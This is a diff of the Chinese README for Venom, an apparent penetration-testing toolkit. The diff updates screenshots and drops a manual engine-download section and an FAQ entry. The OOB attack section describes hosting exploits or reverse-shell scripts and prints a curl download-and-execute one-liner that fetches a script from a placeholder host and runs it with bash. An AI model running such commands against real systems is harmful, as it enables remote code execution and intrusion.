@@ -56,20 +56,6 @@ https://github.com/Zcentury/Venom/releases/latest 点击进入下载
     sudo xattr -dr com.apple.quarantine /Applications/Venom.app
     ```
 
-2. 如果出现引擎无法自动下载情况
-
-    可以采用手动下载方式
-
-    引擎下载地址：https://github.com/Zcentury/Venom-Engine/releases/latest
-    
-    ### 引擎存放路径
-    
-      -   **Windows**: `C:\Users\{{username}}\AppData\Roaming\Venom\engine`
-    
-      -   **macOS**: `/Users/{{username}}/Library/Application Support/Venom/engine`
-    
-    然后将对应架构的引擎放入该目录，重新启动程序
-
 ---
 
 ## 🎮 使用
@@ -82,9 +68,7 @@ https://github.com/Zcentury/Venom/releases/latest 点击进入下载
 
 **极速端口扫描**：将测绘结果直接导入扫描引擎，开启多线程探测。支持自定义端口组（如企业内网 Top100 端口），实时监控扫描进度与存活状态 。
 
-![image-20251203210919852](images/image-20251203210919852.png)
-
-![image-20251203211038491](images/image-20251203211038491.png)
+![image-20260414103433867](images/image-20260414103433867.png)
 
 ### 场景二：🔐 数据清洗与加解密 
 
@@ -100,15 +84,9 @@ https://github.com/Zcentury/Venom/releases/latest 点击进入下载
 
 **数据对比**：快速比对两次请求/响应的文本差异，精确定位参数变化。
 
-![image-20251203211150967](images/image-20251203211150967.png)
+![image-20260414103815321](images/image-20260414103815321.png)
 
-![image-20251203211202711](images/image-20251203211202711.png)
-
-![image-20251203211239429](images/image-20251203211239429.png)
-
-![image-20251203211707660](images/image-20251203211707660.png)
-
-
+![image-20260414103924110](images/image-20260414103924110.png)
 
 ### 场景三：📡 OOB 带外攻击辅助
 
@@ -119,21 +97,19 @@ https://github.com/Zcentury/Venom/releases/latest 点击进入下载
 **Payload 极速投递**：
 
 - 内置轻量级 HTTP 文件服务，支持一键上传 EXP 或反弹 Shell 脚本。
-- 自动生成下载执行命令（如 `curl -L http://... -o echo.sh && bash echo.sh`），大幅缩短漏洞利用窗口 。
+- 自动生成下载执行命令（如 `curl -k -L http://... -o echo.sh && bash echo.sh`），大幅缩短漏洞利用窗口 。
 
-![image-20251203212129310](images/image-20251203212129310.png)
+![image-20260414104548924](images/image-20260414104548924.png)
 
 ```bash
-curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.sh
+curl -k -L https://xxxx/file/1/file -o echo.sh && chmod +x echo.sh && bash echo.sh
 ```
 
-![image-20251203212500617](images/image-20251203212500617.png)
+![image-20260414104528670](images/image-20260414104528670.png)
 
 ### Dnslog
 
-![image-20251203212532726](images/image-20251203212532726.png)
-
-
+![image-20260414104658526](images/image-20260414104658526.png)
 
 ### 场景四：📱 小程序反编译
 
@@ -141,7 +117,7 @@ curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.s
 
 自动识别并提取小程序中调用的所有 API 接口（URL）等常用信息，帮助小程序开发者对小程序进行排查和风险收敛。
 
-![image-20251203212738231](images/image-20251203212738231.png)
+![image-20260414104739289](images/image-20260414104739289.png)
 
 **可自定义解析规则**
 
@@ -155,9 +131,11 @@ curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.s
 
 **自定义启动**：支持配置特定启动参数（如 `java -jar burp.jar`），实现单点登录般的流畅体验，无需在杂乱的文件夹中寻找工具 。
 
-![image-20251203212901460](images/image-20251203212901460.png)
+![image-20260414104752757](images/image-20260414104752757.png)
 
-![image-20251203212945088](images/image-20251203212945088.png)
+![image-20260414104805837](images/image-20260414104805837.png)
+
+![image-20260414104912813](images/image-20260414104912813.png)
 
 ---
 
@@ -176,10 +154,6 @@ curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.s
 
 ---
 ## 💕 问题解答
-
-**Q: 和 `Tscan` 什么关系？**
-
-**A:** 给了我灵感，让我产生了写这个工具的想法，不过我们架构不同，设计模式不同，只是界面像。不过在这里还是要感谢 `Tscan` 团队
 
 **Q: 为什么程序这么大？**
 
@@ -220,6 +194,3 @@ curl -L http://xxxxxxx/file/2/file -o echo.sh && chmod +x echo.sh && bash echo.s
 ## 📈 Star 记录
 
 [![Stargazers over time](https://starchart.cc/Zcentury/Venom.svg?variant=adaptive)](https://starchart.cc/Zcentury/Venom)
-
-
-
